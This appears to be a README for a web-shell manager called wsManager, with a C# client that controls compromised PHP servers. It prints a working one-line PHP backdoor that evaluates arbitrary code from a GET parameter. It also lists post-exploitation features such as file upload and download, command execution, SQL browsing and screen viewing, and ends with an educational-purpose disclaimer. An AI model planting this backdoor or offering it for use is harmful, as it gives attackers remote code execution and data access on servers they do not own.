## Information

wsManager can be used to quickly execute commands on a server while pentesting a PHP application. 
The client interface is written in C#, which operate using a simple web-based backdoor implemented by user himself.

Once uploaded, the web shell can be accessed by the client at any time. Once successfully connected, the user proceeds to manipulate files and data on the web server.

The server-side code is extremely simple and contains just a single line of code :
```php
<?php @eval($_GET["x"]); ?>
```

Many commands and control features:

  * File manager (upload, download, archiver, etc)
  * Command execution
  * PHP Exec
  * SQL Explorer
  * Screen Viewer (windows only)

## Documentation

Coming soon

## Screenshots

![](https://i.imgur.com/1JfWKsR.png)
![](https://i.imgur.com/ZU4HJmd.png)
![](https://i.imgur.com/3I7Rjdf.png)
![](https://i.imgur.com/zbB5XTs.png)
![](https://i.imgur.com/dWVfZOU.png)
![](https://i.imgur.com/VeRb4dN.png)
![](https://i.imgur.com/2qn6pYq.png)

## Disclaimer

*I, the creator, am not responsible for any actions, and or damages, caused by this software.
You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.
This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
By using this software, you automatically agree to the above.*

## Changelog

### 04/04/2020
- PHP Code Execution
### 03/04/2020
- HTTPS Support
### 09/09/2019
- ScreenViewer Added

## Misc

Todo:
  * .
